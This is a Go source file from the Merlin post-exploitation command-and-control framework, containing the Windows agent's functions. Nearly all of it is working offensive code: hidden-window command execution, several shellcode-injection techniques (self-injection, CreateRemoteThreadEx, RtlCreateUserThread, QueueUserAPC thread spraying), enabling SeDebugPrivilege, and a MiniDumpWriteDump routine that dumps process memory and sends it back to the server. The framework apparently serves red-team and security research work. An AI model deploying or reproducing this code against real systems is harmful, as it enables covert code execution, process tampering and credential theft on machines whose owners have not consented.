// +build windows

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"syscall"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"

	// 3rd Party
	"github.com/mattn/go-shellwords"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// MEM_RELEASE is a Windows constant used with Windows API calls
	MEM_RELEASE = 0x8000
	// PAGE_EXECUTE is a Windows constant used with Windows API calls
	PAGE_EXECUTE = 0x10
	// PAGE_EXECUTE_READWRITE is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READWRITE = 0x40
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
	// PROCESS_CREATE_THREAD is a Windows constant used with Windows API calls
	PROCESS_CREATE_THREAD = 0x0002
	// PROCESS_VM_READ is a Windows constant used with Windows API calls
	PROCESS_VM_READ = 0x0010
	//PROCESS_VM_WRITE is a Windows constant used with Windows API calls
	PROCESS_VM_WRITE = 0x0020
	// PROCESS_VM_OPERATION is a Windows constant used with Windows API calls
	PROCESS_VM_OPERATION = 0x0008
	// PROCESS_QUERY_INFORMATION is a Windows constant used with Windows API calls
	PROCESS_QUERY_INFORMATION = 0x0400
	// TH32CS_SNAPHEAPLIST is a Windows constant used with Windows API calls
	TH32CS_SNAPHEAPLIST = 0x00000001
	// TH32CS_SNAPMODULE is a Windows constant used with Windows API calls
	TH32CS_SNAPMODULE = 0x00000008
	// TH32CS_SNAPPROCESS is a Windows constant used with Windows API calls
	TH32CS_SNAPPROCESS = 0x00000002
	// TH32CS_SNAPTHREAD is a Windows constant used with Windows API calls
	TH32CS_SNAPTHREAD = 0x00000004
	// THREAD_SET_CONTEXT is a Windows constant used with Windows API calls
	THREAD_SET_CONTEXT = 0x0010
)

// ExecuteCommand is function used to instruct an agent to execute a command on the host operating system
func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
	var cmd *exec.Cmd

	argS, errS := shellwords.Parse(arg)
	if errS != nil {
		return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
	}

	cmd = exec.Command(name, argS...)

	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Only difference between this and agent.go

	out, err := cmd.CombinedOutput()
	stdout = string(out)
	stderr = ""

	if err != nil {
		stderr = err.Error()
	}

	return stdout, stderr
}

// ExecuteShellcodeSelf executes provided shellcode in the current process
func ExecuteShellcodeSelf(shellcode []byte) error {

	kernel32 := windows.NewLazySystemDLL("kernel32")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	//VirtualProtect := kernel32.NewProc("VirtualProtectEx")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAlloc failed and returned 0")
	}

	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling RtlCopyMemory:\r\n" + errRtlCopyMemory.Error())
	}
	// TODO set initial memory allocation to rw and update to execute; currently getting "The parameter is incorrect."
	/*	_, _, errVirtualProtect := VirtualProtect.Call(uintptr(addr), uintptr(len(shellcode)), PAGE_EXECUTE)
		if errVirtualProtect.Error() != "The operation completed successfully." {
			return errVirtualProtect
		}*/

	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)

	if errSyscall != 0 {
		return errors.New("Error executing shellcode syscall:\r\n" + errSyscall.Error())
	}

	return nil
}

// ExecuteShellcodeRemote executes provided shellcode in the provided target process
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
	kernel32 := windows.NewLazySystemDLL("kernel32")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")

	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

	if errOpenProcess != nil {
		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
	}

	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling CreateRemoteThreadEx:\r\n" + errCreateRemoteThreadEx.Error())
	}

	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}

	return nil
}

// ExecuteShellcodeRtlCreateUserThread executes provided shellcode in the provided target process using the Windows RtlCreateUserThread call
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
	kernel32 := windows.NewLazySystemDLL("kernel32")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CloseHandle := kernel32.NewProc("CloseHandle")
	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

	if errOpenProcess != nil {
		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
	}

	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
	}

	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	/*
		NTSTATUS
		RtlCreateUserThread(
			IN HANDLE Process,
			IN PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL,
			IN BOOLEAN CreateSuspended,
			IN ULONG ZeroBits OPTIONAL,
			IN SIZE_T MaximumStackSize OPTIONAL,
			IN SIZE_T CommittedStackSize OPTIONAL,
			IN PUSER_THREAD_START_ROUTINE StartAddress,
			IN PVOID Parameter OPTIONAL,
			OUT PHANDLE Thread OPTIONAL,
			OUT PCLIENT_ID ClientId OPTIONAL
			)
	*/
	var tHandle uintptr
	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)

	if errRtlCreateUserThread.Error() != "The operation completed successfully." {
		return errors.New("Error calling RtlCreateUserThread:\r\n" + errRtlCreateUserThread.Error())
	}

	_, _, errWaitForSingleObject := WaitForSingleObject.Call(tHandle, syscall.INFINITE)
	if errWaitForSingleObject.Error() != "The operation completed successfully." {
		return errors.New("Error calling WaitForSingleObject:\r\n" + errWaitForSingleObject.Error())
	}

	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}

	return nil
}

// ExecuteShellcodeQueueUserAPC executes provided shellcode in the provided target process using the Windows QueueUserAPC API call
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
	// TODO this can be local or remote
	kernel32 := windows.NewLazySystemDLL("kernel32")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CloseHandle := kernel32.NewProc("CloseHandle")
	CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
	Thread32First := kernel32.NewProc("Thread32First")
	Thread32Next := kernel32.NewProc("Thread32Next")
	OpenThread := kernel32.NewProc("OpenThread")

	// Consider using NtQuerySystemInformation to replace CreateToolhelp32Snapshot AND to find a thread in a wait state
	// https://stackoverflow.com/questions/22949725/how-to-get-thread-state-e-g-suspended-memory-cpu-usage-start-time-priori

	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)

	if errOpenProcess != nil {
		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
	}
	// TODO see if you can use just SNAPTHREAD
	sHandle, _, errCreateToolhelp32Snapshot := CreateToolhelp32Snapshot.Call(TH32CS_SNAPHEAPLIST|TH32CS_SNAPMODULE|TH32CS_SNAPPROCESS|TH32CS_SNAPTHREAD, uintptr(pid))
	if errCreateToolhelp32Snapshot.Error() != "The operation completed successfully." {
		return errors.New("Error calling CreateToolhelp32Snapshot:\r\n" + errCreateToolhelp32Snapshot.Error())
	}

	// TODO don't allocate/write memory unless there is a valid thread
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
	}

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
	}

	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
	}

	type THREADENTRY32 struct {
		dwSize             uint32
		cntUsage           uint32
		th32ThreadID       uint32
		th32OwnerProcessID uint32
		tpBasePri          int32
		tpDeltaPri         int32
		dwFlags            uint32
	}
	var t THREADENTRY32
	t.dwSize = uint32(unsafe.Sizeof(t))

	_, _, errThread32First := Thread32First.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
	if errThread32First.Error() != "The operation completed successfully." {
		return errors.New("Error calling Thread32First:\r\n" + errThread32First.Error())
	}
	i := true
	x := 0
	// Queue an APC for every thread; very unstable and not ideal, need to programmatically find alertable thread
	for i {
		_, _, errThread32Next := Thread32Next.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
		if errThread32Next.Error() == "There are no more files." {
			if x == 1 {
				// don't queue to main thread when using the "spray all threads" technique
				// often crashes process
				return errors.New("the process only has 1 thread; APC not queued")
			}
			i = false
			break
		} else if errThread32Next.Error() != "The operation completed successfully." {
			return errors.New("Error calling Thread32Next:\r\n" + errThread32Next.Error())
		}
		if t.th32OwnerProcessID == pid {
			if x > 0 {
				tHandle, _, errOpenThread := OpenThread.Call(THREAD_SET_CONTEXT, 0, uintptr(t.th32ThreadID))
				if errOpenThread.Error() != "The operation completed successfully." {
					return errors.New("Error calling OpenThread:\r\n" + errOpenThread.Error())
				}
				// fmt.Println(fmt.Sprintf("Queueing APC for PID: %d, Thread %d", pid, t.th32ThreadID))
				_, _, errQueueUserAPC := QueueUserAPC.Call(addr, tHandle, 0)
				if errQueueUserAPC.Error() != "The operation completed successfully." {
					return errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
				}
				x++
				_, _, errCloseHandle := CloseHandle.Call(tHandle)
				if errCloseHandle.Error() != "The operation completed successfully." {
					return errors.New("Error calling thread CloseHandle:\r\n" + errCloseHandle.Error())
				}
			} else {
				x++
			}
		}

	}
	// TODO check process to make sure it didn't crash
	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
	if errCloseHandle.Error() != "The operation completed successfully." {
		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
	}

	return nil
}

// TODO always close handle during exception handling

// miniDump will attempt to perform use the Windows MiniDumpWriteDump API operation on the provided process, and returns
// the raw bytes of the dumpfile back as an upload to the server.
// Touches disk during the dump process, in the OS default temporary or provided temporary directory
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
	var mini map[string]interface{}
	mini = make(map[string]interface{})
	var err error

	// Make sure temporary directory exists before executing miniDump functionality
	if tempDir != "" {
		d, errS := os.Stat(tempDir)
		if os.IsNotExist(errS) {
			return mini, fmt.Errorf("the provided directory does not exist: %s", tempDir)
		}
		if d.IsDir() != true {
			return mini, fmt.Errorf("the provided path is not a valid directory: %s", tempDir)
		}
	} else {
		tempDir = os.TempDir()
	}

	// Get the process PID or name
	mini["ProcName"], mini["ProcID"], err = getProcess(process, inPid)
	if err != nil {
		return mini, err
	}

	// Get debug privs (required for dumping processes not owned by current user)
	err = sePrivEnable("SeDebugPrivilege")
	if err != nil {
		return mini, err
	}

	// Get a handle to process
	hProc, err := syscall.OpenProcess(0x1F0FFF, false, mini["ProcID"].(uint32)) //PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
	if err != nil {
		return mini, err
	}

	// Set up the temporary file to write to, automatically remove it once done
	// TODO: Work out how to do this in memory
	f, tempErr := ioutil.TempFile(tempDir, "*.tmp")
	if tempErr != nil {
		return mini, tempErr
	}

	// Remove the file after the function exits, regardless of error nor not
	defer os.Remove(f.Name())

	// Load MiniDumpWriteDump function from DbgHelp.dll
	k32 := windows.NewLazySystemDLL("DbgHelp.dll")
	miniDump := k32.NewProc("MiniDumpWriteDump")

	/*
		BOOL MiniDumpWriteDump(
		  HANDLE                            hProcess,
		  DWORD                             ProcessId,
		  HANDLE                            hFile,
		  MINIDUMP_TYPE                     DumpType,
		  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
		  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
		  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
		);
	*/
	// Call Windows MiniDumpWriteDump API
	r, _, _ := miniDump.Call(uintptr(hProc), uintptr(mini["ProcID"].(uint32)), f.Fd(), 3, 0, 0, 0)

	f.Close() //idk why this fixes the 'not same as on disk' issue, but it does

	if r != 0 {
		mini["FileContent"], err = ioutil.ReadFile(f.Name())
		if err != nil {
			f.Close()
			return mini, err
		}
	}
	return mini, nil
}

// getProcess takes in a process name OR a process ID and returns a pointer to the process handle, the process name,
// and the process ID.
func getProcess(name string, pid uint32) (string, uint32, error) {
	//https://github.com/mitchellh/go-ps/blob/master/process_windows.go

	if pid <= 0 && name == "" {
		return "", 0, fmt.Errorf("a process name OR process ID must be provided")
	}

	snapshotHandle, err := syscall.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if snapshotHandle < 0 || err != nil {
		return "", 0, fmt.Errorf("there was an error creating the snapshot:\r\n%s", err)
	}
	defer syscall.CloseHandle(snapshotHandle)

	var process syscall.ProcessEntry32
	process.Size = uint32(unsafe.Sizeof(process))
	err = syscall.Process32First(snapshotHandle, &process)
	if err != nil {
		return "", 0, fmt.Errorf("there was an accessing the first process in the snapshot:\r\n%s", err)
	}

	for {
		processName := ""
		// Iterate over characters to build a full string
		for _, chr := range process.ExeFile {
			if chr != 0 {
				processName = processName + string(int(chr))
			}
		}
		if pid > 0 {
			if process.ProcessID == pid {
				return processName, pid, nil
			}
		} else if name != "" {
			if processName == name {
				return name, process.ProcessID, nil
			}
		}
		err = syscall.Process32Next(snapshotHandle, &process)
		if err != nil {
			break
		}
	}
	return "", 0, fmt.Errorf("could not find a procces with the supplied name \"%s\" or PID of \"%d\"", name, pid)
}

// sePrivEnable adjusts the privileges of the current process to add the passed in string. Good for setting 'SeDebugPrivilege'
func sePrivEnable(s string) error {
	type LUID struct {
		LowPart  uint32
		HighPart int32
	}
	type LUID_AND_ATTRIBUTES struct {
		Luid       LUID
		Attributes uint32
	}
	type TOKEN_PRIVILEGES struct {
		PrivilegeCount uint32
		Privileges     [1]LUID_AND_ATTRIBUTES
	}

	modadvapi32 := windows.NewLazySystemDLL("advapi32.dll")
	procAdjustTokenPrivileges := modadvapi32.NewProc("AdjustTokenPrivileges")

	procLookupPriv := modadvapi32.NewProc("LookupPrivilegeValueW")
	var tokenHandle syscall.Token
	thsHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		return err
	}
	syscall.OpenProcessToken(
		//r, a, e := procOpenProcessToken.Call(
		thsHandle,                       //  HANDLE  ProcessHandle,
		syscall.TOKEN_ADJUST_PRIVILEGES, //	DWORD   DesiredAccess,
		&tokenHandle,                    //	PHANDLE TokenHandle
	)
	var luid LUID
	r, _, e := procLookupPriv.Call(
		uintptr(0), //LPCWSTR lpSystemName,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(s))), //LPCWSTR lpName,
		uintptr(unsafe.Pointer(&luid)),                       //PLUID   lpLuid
	)
	if r == 0 {
		return e
	}
	SE_PRIVILEGE_ENABLED := uint32(0x00000002)
	privs := TOKEN_PRIVILEGES{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	//AdjustTokenPrivileges(hToken, false, &priv, 0, 0, 0)
	r, _, e = procAdjustTokenPrivileges.Call(
		uintptr(tokenHandle),
		uintptr(0),
		uintptr(unsafe.Pointer(&privs)),
		uintptr(0),
		uintptr(0),
		uintptr(0),
	)
	if r == 0 {
		return e
	}
	return nil
}
